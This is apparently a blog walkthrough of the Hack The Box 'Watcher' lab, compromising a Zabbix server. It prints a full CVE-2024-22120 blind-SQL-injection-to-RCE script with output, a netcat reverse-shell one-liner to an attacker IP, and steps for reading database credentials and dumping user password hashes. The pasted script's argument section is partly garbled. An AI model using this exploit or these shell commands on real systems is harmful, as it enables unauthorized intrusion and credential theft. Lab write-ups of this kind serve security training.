---
title: Watcher
date: 2026-03-23
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
  - Linux
  - medium
lastmod: 2026-03-28T08:09:41.364Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/watcher" >}}

***

# Recon

### PORT & IP SCAN

The `nmap`  Scan is fast within 3 min , and which is the Linux machine by Ubuntu .

The Apache httpd 2.4.52 will redirect to another page , it may accept other request method

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ cat serviceScan.txt 
# Nmap 7.98 scan initiated Mon Mar 23 22:07:27 2026 as: /usr/lib/nmap/nmap -sC -sV -p 22,80,10050,10051,43047 -T4 -oN serviceScan.txt 10.129.234.163
Nmap scan report for 10.129.234.163
Host is up (0.048s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f0:e4:e7:ae:27:22:14:09:0c:fe:1a:aa:85:a8:c3:a5 (ECDSA)
|_  256 fd:a3:b9:36:17:39:25:1d:40:6d:5a:07:97:b3:42:13 (ED25519)
80/tcp    open  http       Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Did not follow redirect to http://watcher.vl/
|_http-server-header: Apache/2.4.52 (Ubuntu)
10050/tcp open  tcpwrapped
10050/tcp open  tcpwrapped
43047/tcp open  java-rmi   Java RMI
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 23 22:07:47 2026 -- 1 IP address (1 host up) scanned in 20.22 seconds
                                                                                      
```

The port of 10050 and 10050 , the nmap shows that is tcpwrapped , The service is running, but the connection was dropped , so i will check it at the end

but i will check the port of `43047` first due to that is not too hard to find any exploit in there , after that i will back to http 80

### Java RMI

https://hacktricks.wiki/en/network-services-pentesting/1099-pentesting-java-rmi.html?highlight=RMI#rmi-**components**

```
$ sudo apt install maven -y
$ git clone https://github.com/qtc-de/remote-method-guesser
$ cd remote-method-guesser
$ mvn package
```

```
java -jar target/rmg-5.1.0-jar-with-dependencies.jar guess 10.129.234.163 43047
```

```
──(parallels㉿kali-linux-2025-2)-[~/Desktop/remote-method-guesser]
└─$ java -jar /home/parallels/Desktop/remote-method-guesser/target/rmg-5.1.0-jar-with-dependencies.jar guess 10.129.234.163 43047
[-] Caught NoSuchObjectException during RMI call.
[-] There seems to be no registry object available on the specified endpoint.
[-] Cannot continue from here.

```

ok , next one

### Watcher.vl

{{< tech-stack >}}

OS: Ubuntu Linux\
Web Server: Apache/2.4.52\
Language: PHP 8.1\
Database: MySQL 8.0\
Application: Zabbix

{{< /tech-stack >}}

when i go to the http://10.129.234.163 , it will redirect to http://watcher.vl/

Therefore , i will add the watcher.vl into the /etc/hosts

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali-linux-2025-2.localdomain   kali-linux-2025-2
10.129.234.163  watcher.vl

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

after added , the website will be success loaded

![Pasted image 20260323230943.png](/ob/Pasted%20image%2020260323230943.png)

before to do the next , i will like to increase the attack area , like to do the subdomain brute-force to see there are any other subdomain in here

```
──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ ffuf -w ./subdomains-top1million-20000.txt:FUZZ  -u http://10.129.234.163 -H 'Host: FUZZ.watcher.vl' -ac 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.234.163
 :: Wordlist         : FUZZ: /home/parallels/Desktop/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.watcher.vl
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

zabbix                  [Status: 200, Size: 3946, Words: 199, Lines: 33, Duration: 328ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

```

add into /etc/hosts

```
10.129.234.163  watcher.vl zabbix.watcher.vl
```

### zabbix.watcher.vl

![Pasted image 20260323231656.png](/ob/Pasted%20image%2020260323231656.png)

I noted that there is the option for `sign in as guest`

#### Tech stack

The HTTP response headers

{{< code >}}

OS: Ubuntu Linux\
Web Server: Apache/2.4.52\
Language: PHP 8.1\
Database: MySQL 8.0\
Application: Zabbix

{{< /code >}}

![Pasted image 20260327132445.png](/ob/Pasted%20image%2020260327132445.png)

![Pasted image 20260323231656.png](/ob/Pasted%20image%2020260323231656.png)

# Shell as Zabbix

I noted that there is the option for `sign in as guest`

***

![Pasted image 20260327132323.png](/ob/Pasted%20image%2020260327132323.png)

CMS Server is Zabbix 7.0.0alpha1

[CVE-2024-22120](https://www.cvedetails.com/cve/CVE-2024-22120/)

reference : W01fhcker\
https://github.com/W01fh4cker/CVE-2024-22120-RCE

https://support.zabbix.com/browse/ZBX-24505

![Pasted image 20260327135251.png](/ob/Pasted%20image%2020260327135251.png)

![Pasted image 20260327140040.png](/ob/Pasted%20image%2020260327140040.png)

Extract any hostid available to this user (open Monitoring->Hosts, host id will be in response)

t69c61c57a0f16586261005\
![Pasted image 20260327135952.png](/ob/Pasted%20image%2020260327135952.png)

```
uv add --script zabbix_server_time_based_blind_sqli.py pwntools
```

```
➜  watcher uv run  --script zabbix_server_time_based_blind_sqli.py  --ip 10.129.234.163 --hostid 10084 --sid e85607b598e315b362b7e06ce22126e6  | grep "(+)"  
(+) Extracting Zabbix config session key...
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=0
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=00
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=0001
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=00010
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=000101
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=0001010
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=00010100
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=000101000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=0001010001
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=00010100010
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=000101000100
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=0001010001001
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=00010100010010
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=000101000100100
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=0001010001001000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=00010100010010000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=000101000100100001
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=0001010001001000010
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=00010100010010000100
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=000101000100100001001
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=0001010001001000010010
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=00010100010010000100100
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=000101000100100001001000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=0001010001001000010010000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=00010100010010000100100000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=000101000100100001001000000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=0001010001001000010010000000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=00010100010010000100100000000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=000101000100100001001000000000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=0001010001001000010010000000000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_key=00010100010010000100100000000000
(+) config session_key=00010100010010000100100000000000
(+) Extracting admin session_id...
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=1
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=11
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=110
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=1100
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=11000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=110000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=1100001
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=11000010
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=110000100
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=1100001000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=11000010001
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=110000100010
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=1100001000100
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=11000010001000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=110000100010001
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=1100001000100010
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=11000010001000100
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=110000100010001000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=1100001000100010000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=11000010001000100000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=110000100010001000000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=1100001000100010000000
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=11000010001000100000001
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=110000100010001000000010
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=1100001000100010000000101
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=11000010001000100000001011
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=110000100010001000000010111
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=1100001000100010000000101110
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=11000010001000100000001011100
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=110000100010001000000010111001
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) trying c=1[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=1100001000100010000000101110011
(+) trying c=0[x] Opening connection to 10.129.234.163 on port 10051
(+) session_id=11000010001000100000001011100110
(+) admin session_id=11000010001000100000001011100110
(+) session_key=00010100010010000100100000000000, admin session_id=11000010001000100000001011100110. Now you can genereate admin zbx_cookie and sign it with session_key
➜  watcher 

```

```
➜  CVE-2024-22120-RCE git:(main) python CVE-2024-22120-RCE.py --ip zabbix.watcher.vl   --sid e85607b598e315b362b7e06ce22126e6 --hostid 10084
(!) sessionid=e29cc8d946f1a3135fe7ceec60d0ff0d1a3135fe7ceec60d0ff0d
[zabbix_cmd]>>:  whoami 
zabbix

[zabbix_cmd]>>:  pwd
/

[zabbix_cmd]>>:  cd ..

[zabbix_cmd]>>:  ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
swapfile
sys
tmp
user.txt
usr
var

[zabbix_cmd]>>:  cd home

[zabbix_cmd]>>:  ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
swapfile
sys
tmp
user.txt
usr
var

[zabbix_cmd]>>:  cat user.txt
380b4ab4ba51812267f92b1a3dc131f3


```

Do the change for get the shell if i have ethe admin session id

```
➜  CVE-2024-22120-RCE git:(main) ✗ cat CVE-2024-22120-RCE.py 
import json
import argparse
import requests
from pwn import *
from datetime import datetime

RED = '\033[0;31m'
NC = '\033[0;0m'
GREEN = '\033[0;32m'

def SendMessage(ip, port, sid, hostid, injection):
    context.log_level = "CRITICAL"
    zbx_header = "ZBXD\x01".encode()
    message = {
        "request": "command",
        "sid": sid,
        "scriptid": "2",
        "clientip": "1' + " + injection + "+ '1",
        "hostid": hostid
    }
    message_json = json.dumps(message)
    message_length = struct.pack('<q', len(message_json))
    message = zbx_header + message_length + message_json.encode()
    r = remote(ip, port, level="CRITICAL")
    r.send(message)
    ret = r.recv(1024)
    r.close()

def ExtractAdminSessionId(ip, port, sid, hostid, time_false, time_true):
    session_id = ""
    token_length = 32
    for i in range(1, token_length+1):
        for c in string.digits + "abcdef":
            before_query = datetime.now().timestamp()
            query = "(select CASE WHEN (substr((select sessionid from sessions where userid=1 limit 1),%d,1)=\"%c\") THEN sleep(%d) ELSE sleep(%d) END)" % (i, c, time_true, time_false)
            SendMessage(ip, port, sid, hostid, query)
            after_query = datetime.now().timestamp()
            diff = after_query-before_query
            print(f"(+) Finding session_id\t sessionid={GREEN}{session_id}{RED}{c}{NC}", end='\r')
            if time_true > (after_query-before_query) > time_false:
                continue
            else:
                session_id += c
                #print("(+) session_id=%s" % session_id, flush=True)
                break
    print(f"(!) sessionid={session_id}")
    return session_id

def GenerateRandomString(length):
    characters = string.ascii_letters + string.digits
    return "".join(random.choices(characters, k=length))

def CreateScript(url, headers, admin_sessionid, cmd):
    name = GenerateRandomString(8)
    payload = {
        "jsonrpc": "2.0",
        "method": "script.create",
        "params": {
            "name": name,
            "command": "" + cmd + "",
            "type": 0,
            "execute_on": 2,
            "scope": 2
        },
        "auth": admin_sessionid,
        "id": 0,
    }
    resp = requests.post(url, data=json.dumps(payload), headers=headers)
    return json.loads(resp.text)["result"]["scriptids"][0]

def UpdateScript(url, headers, admin_sessionid, cmd, scriptid):
    payload = {
        "jsonrpc": "2.0",
        "method": "script.update",
        "params": {
            "scriptid": scriptid,
            "command": "" + cmd + ""
        },
        "auth": admin_sessionid,
        "id": 0,
    }
    requests.post(url, data=json.dumps(payload), headers=headers)

def DeleteScript(url, headers, admin_sessionid, scriptid):
    payload = {
        "jsonrpc": "2.0",
        "method": "script.delete",
        "params": [scriptid],
        "auth": admin_sessionid,
        "id": 0,
    }
    resp = requests.post(url, data=json.dumps(payload), headers=headers)
    if resp.status_code == 200 and json.loads(resp.text)["result"]["scriptids"] == scriptid:
        return True
    else:
        return False

def RceExploit(ip, hostid, admin_sessionid,prefix):
    if prefix:
        url = f"http://{ip}/{prefix}/api_jsonrpc.php"
    else:
        url = f"http://{ip}/api_jsonrpc.php"
    headers = {
        "content-type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    }
    scriptid = CreateScript(url, headers, admin_sessionid, "whoami")
    while True:
        cmd = input('\033[41m[zabbix_cmd]>>: \033[0m ')
        if cmd == "":
            print("Result of last command:")
        elif cmd == "quit":
            DeleteScript(url, headers, admin_sessionid, scriptid)
            break
        UpdateScript(url, headers, admin_sessionid, cmd, scriptid)
        payload = {
            "jsonrpc": "2.0",
            "method": "script.execute",
            "params": {
                "scriptid": scriptid,
                "hostid": hostid
            },
            "auth": admin_sessionid,
            "id": 0,
        }
        cmd_exe = requests.post(url, data=json.dumps(payload), headers=headers)
        cmd_exe_json = cmd_exe.json()
        if "error" not in cmd_exe.text:
            print(cmd_exe_json["result"]["value"])
        else:
            print(cmd_exe_json["error"]["data"])

if __name__ == "__main__":
    if __name__ == "__main__":
        parser = argparse.ArgumentParser(description="CVE-2024-22120-RCE")
        parser.add_argument("--false_time",
                            help="Time to sleep in case of wrong guess(make it smaller than true time, default=1)",
                            default="1")
        parser.add_argument("--true_time",
                            help="Time to sleep in case of right guess(make it bigger than false time, default=10)",
                            default="10")
        parser.add_argument("--ip", help="Zabbix server IP")
        parser.add_argument("--port", help="Zabbix server port(default=10051)", default="10051")
        parser.add_argument("--sid", help="Session ID of low privileged user")
        parser.add_argument("--hostid", help="hostid of any host accessible to user with defined sid")
        parser.add_argument("--prefix", help="Prefix for zabbix site. eg: https://ip/PREFIX/index.php")
        args = parser.parse_args()
        admin_sessionid = ExtractAdminSessionId(args.ip, int(args.port), args.sid, args.hostid, int(args.false_time), int(args.true_time))
        RceExploit(args.ip, args.hostid, admin_sessionid,args.prefix)
                parser.add_argument("--admin-sid", help="Admin session id already recovered")
        args = parser.parse_args()
        if args.admin_sid:
            admin_sessionid = args.admin_sid
        else:
            admin_sessionid = ExtractAdminSessionId(args.ip, int(args.port), args.sid, args.hostid, int(args.false_time), int(args.true_time))
        RceExploit(args.ip, args.hostid, admin_sessionid,args.prefix)
```

# Shell as ROOT

```
[zabbix_cmd]>>:  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.6 1234 >/tmp/f
```

```
➜  CVE-2024-22120-RCE git:(main) ✗ sudo nc -lvnp 1234
listening on [any] 80 ...
connect to [10.10.16.6] from (UNKNOWN) [10.129.234.163] 57864
sh: 0: can't access tty; job control turned off
$ 
```

do the standard python upgarde

```

➜  CVE-2024-22120-RCE git:(main) ✗ sudo nc -lvnp 1234
listening on [any] 80 ...
connect to [10.10.16.6] from (UNKNOWN) [10.129.234.163] 42740
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
zabbix@watcher:/$ ^Z
[1]  + 29702 suspended  sudo nc -lvnp 80
➜  CVE-2024-22120-RCE git:(main) ✗ stty raw -echo;fg
[1]  + 29702 continued  sudo nc -lvnp 80
                                        export TERM=xterm
zabbix@watcher:/$ id
uid=115(zabbix) gid=122(zabbix) groups=122(zabbix)
zabbix@watcher:/$ 


```

in the zabbix home

```
zabbix@watcher:/home$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
zabbix@watcher:/home$ 
```

```
➜  CVE-2024-22120-RCE git:(main) ✗ sudo python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...


➜  CVE-2024-22120-RCE git:(main) ✗ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
--2026-03-28 01:30:31--  https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.

```

linux priv

we are the zabbix who dont in the /etc/passwd , so the .cron , and the injection will not working in here .

check the source code --> no\
check the home --> no\
sudo -l\
check the proxy , like the apache , nginx\
check the port

```
zabbix@watcher:/etc$ ls
ls
PackageKit                     inputrc                 pollinate
X11                            iproute2                ppp
acpi                           iscsi                   profile
adduser.conf                   issue                   profile.d
alternatives                   issue.net               protocols
apache2                        java-11-openjdk         python3
apparmor                       kernel                  python3.10
apparmor.d                     kernel-img.conf         rc0.d
apport                         landscape               rc1.d
apt                            laurel                  rc2.d
audit                          ld.so.cache             rc3.d
bash.bashrc                    ld.so.conf              rc4.d
bash_completion                ld.so.conf.d            rc5.d
bash_completion.d              ldap                    rc6.d
bindresvport.blacklist         legal                   rcS.d
binfmt.d                       libaudit.conf           resolv.conf
byobu                          libblockdev             rmt
ca-certificates                libnl-3                 rpc
ca-certificates.conf           locale.alias            rsyslog.conf
ca-certificates.conf.dpkg-old  locale.gen              rsyslog.d
chrony                         localtime               screenrc
cloud                          logcheck                security
console-setup                  login.defs              selinux
cron.d                         logrotate.conf          sensors.d
cron.daily                     logrotate.d             sensors3.conf
cron.hourly                    lsb-release             services
cron.monthly                   lvm                     shadow
cron.weekly                    machine-id              shadow-
crontab                        magic                   shells
cryptsetup-initramfs           magic.mime              skel
crypttab                       mailcap                 snmp
dbus-1                         mailcap.order           sos
debconf.conf                   manpath.config          ssh
debian_version                 mdadm                   ssl
default                        mecabrc                 subgid
deluser.conf                   mime.types              subgid-
depmod.d                       mke2fs.conf             subuid
dhcp                           modprobe.d              subuid-
dpkg                           modules                 sudo.conf
e2scrub.conf                   modules-load.d          sudo_logsrvd.conf
ec2_version                    mtab                    sudoers
emacs                          multipath               sudoers.d
environment                    multipath.conf          sysctl.conf
ethertypes                     mysql                   sysctl.d
fonts                          nanorc                  systemd
fstab                          needrestart             terminfo
fuse.conf                      netconfig               timezone
gai.conf                       netplan                 tmpfiles.d
groff                          network                 ubuntu-advantage
group                          networkd-dispatcher     ucf.conf
group-                         networks                udev
grub.d                         newt                    ufw
gshadow                        nftables.conf           update-manager
gshadow-                       nsswitch.conf           update-motd.d
gss                            opt                     update-notifier
hdparm.conf                    os-release              usb_modeswitch.conf
hibagent-config.cfg            overlayroot.conf        usb_modeswitch.d
hibinit-config.cfg             overlayroot.local.conf  vim
host.conf                      pam.conf                vmware-tools
hostname                       pam.d                   vtrgb
hosts                          passwd                  wgetrc
hosts.allow                    passwd-                 xattr.conf
hosts.deny                     perl                    xdg
init                           php                     zsh_command_not_found
init.d                         pm
initramfs-tools                polkit-1

```

```
zabbix@watcher:/etc/apache2/sites-available$ ls
ls
000-default.conf  default-ssl.conf  watcher.vl.conf  zabbix.watcher.vl.conf
zabbix@watcher:/etc/apache2/sites-available$ 
```

```
zabbix@watcher:/etc/apache2/sites-available$ cat zabbix.watcher.vl.conf
cat zabbix.watcher.vl.conf
# Define /zabbix alias, this is the default

<VirtualHost *:80>
    ServerAdmin webmaster@watcher.vl
    ServerName zabbix.watcher.vl

DocumentRoot /usr/share/zabbix

<Directory "/usr/share/zabbix">
    Options FollowSymLinks
    AllowOverride None
    Order allow,deny
    Allow from all

    <IfModule mod_php.c>
        php_value max_execution_time 300
        php_value memory_limit 128M
        php_value post_max_size 16M
        php_value upload_max_filesize 2M
        php_value max_input_time 300
        php_value max_input_vars 10000
        php_value always_populate_raw_post_data -1
    </IfModule>

    <IfModule mod_php7.c>
        php_value max_execution_time 300
        php_value memory_limit 128M
        php_value post_max_size 16M
        php_value upload_max_filesize 2M
        php_value max_input_time 300
        php_value max_input_vars 10000
        php_value always_populate_raw_post_data -1
    </IfModule>
</Directory>

<Directory "/usr/share/zabbix/conf">
    Order deny,allow
    Deny from all
    <files *.php>
        Order deny,allow
        Deny from all
    </files>
</Directory>

<Directory "/usr/share/zabbix/app">
    Order deny,allow
    Deny from all
    <files *.php>
        Order deny,allow
        Deny from all
    </files>
</Directory>

<Directory "/usr/share/zabbix/include">
    Order deny,allow
    Deny from all
    <files *.php>
        Order deny,allow
        Deny from all
    </files>
</Directory>

<Directory "/usr/share/zabbix/local">
    Order deny,allow
    Deny from all
    <files *.php>
        Order deny,allow
        Deny from all
    </files>
</Directory>

<Directory "/usr/share/zabbix/vendor">
    Order deny,allow
    Deny from all
    <files *.php>
        Order deny,allow
        Deny from all
    </files>
</Directory>
</VirtualHost>


```

/usr/share/zabbix

```
[zabbix_cmd]>>:  ls /usr/share/zabbix
api_jsonrpc.php
api_scim.php
app
assets
audio
browserwarning.php
chart.php
chart2.php
chart3.php
chart4.php
chart6.php
chart7.php
composer.json
composer.lock
conf
data
disc_prototypes.php
favicon.ico
graphs.php
history.php
host_discovery.php
host_prototypes.php
hostinventories.php
hostinventoriesoverview.php
httpconf.php
httpdetails.php
image.php
imgstore.php
include
index.php
index_http.php
index_sso.php
items.php
js
jsLoader.php
jsrpc.php
local
locale
map.php
modules
report2.php
report4.php
robots.txt
setup.php
sysmap.php
sysmaps.php
templates.php
tests
toptriggers.php
tr_events.php
trigger_prototypes.php
triggers.php
vendor
widgets
zabbix.php

```

which one is contain the sentive data ?

gemini , give the answer\
![Pasted image 20260328141108.png](/ob/Pasted%20image%2020260328141108.png)

```
[zabbix_cmd]>>:  cat /usr/share/zabbix/conf/zabbix.conf.php
<?php
// Zabbix GUI configuration file.

$DB['TYPE']                     = 'MYSQL';
$DB['SERVER']                   = 'localhost';
$DB['PORT']                     = '0';
$DB['DATABASE']                 = 'zabbix';
$DB['USER']                     = 'zabbix';
$DB['PASSWORD']                 = 'uIy@YyshSuyW%0_puSqA';

// Schema name. Used for PostgreSQL.
$DB['SCHEMA']                   = '';

// Used for TLS connection.
$DB['ENCRYPTION']               = false;
$DB['KEY_FILE']                 = '';
$DB['CERT_FILE']                = '';
$DB['CA_FILE']                  = '';
$DB['VERIFY_HOST']              = false;
$DB['CIPHER_LIST']              = '';

// Vault configuration. Used if database credentials are stored in Vault secrets manager.
$DB['VAULT']                    = '';
$DB['VAULT_URL']                = '';
$DB['VAULT_DB_PATH']            = '';
$DB['VAULT_TOKEN']              = '';
$DB['VAULT_CERT_FILE']          = '';
$DB['VAULT_KEY_FILE']           = '';
// Uncomment to bypass local caching of credentials.
// $DB['VAULT_CACHE']           = true;

// Uncomment and set to desired values to override Zabbix hostname/IP and port.
// $ZBX_SERVER                  = '';
// $ZBX_SERVER_PORT             = '';

$ZBX_SERVER_NAME                = 'Watcher';

$IMAGE_FORMAT_DEFAULT   = IMAGE_FORMAT_PNG;

// Uncomment this block only if you are using Elasticsearch.
// Elasticsearch url (can be string if same url is used for all types).
//$HISTORY['url'] = [
//      'uint' => 'http://localhost:9200',
//      'text' => 'http://localhost:9200'
//];
// Value types stored in Elasticsearch.
//$HISTORY['types'] = ['uint', 'text'];

// Used for SAML authentication.
// Uncomment to override the default paths to SP private key, SP and IdP X.509 certificates, and to set extra settings.
//$SSO['SP_KEY']                        = 'conf/certs/sp.key';
//$SSO['SP_CERT']                       = 'conf/certs/sp.crt';
//$SSO['IDP_CERT']              = 'conf/certs/idp.crt';
//$SSO['SETTINGS']              = [];


```

```
zabbix@watcher:/usr/share/zabbix/conf$ mysql -h localhost -u zabbix -puIy@YyshSuyW%0_puSqA
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 3339
Server version: 8.0.43-0ubuntu0.22.04.2 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| zabbix             |
+--------------------+
3 rows in set (0.02 sec
```

```
mysql> select * from users;
+--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+------------+---------------+---------------+----------+--------+-----------------+----------------+
| userid | username | name   | surname       | passwd                                                       | url | autologin | autologout | lang    | refresh | theme   | attempt_failed | attempt_ip | attempt_clock | rows_per_page | timezone | roleid | userdirectoryid | ts_provisioned |
+--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+------------+---------------+---------------+----------+--------+-----------------+----------------+
|      1 | Admin    | Zabbix | Administrator | $2y$10$E9fSsSLiu47a1gnTULjx9.YygFRbVotGx4BOIVRTLdEa5OGAxeX5i |     |         1 | 0          | default | 30s     | default |              0 |            |             0 |            50 | default  |      3 |            NULL |              0 |
|      2 | guest    |        |               | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |     |         0 | 15m        | default | 30s     | default |              0 |            |             0 |            50 | default  |      4 |            NULL |              0 |
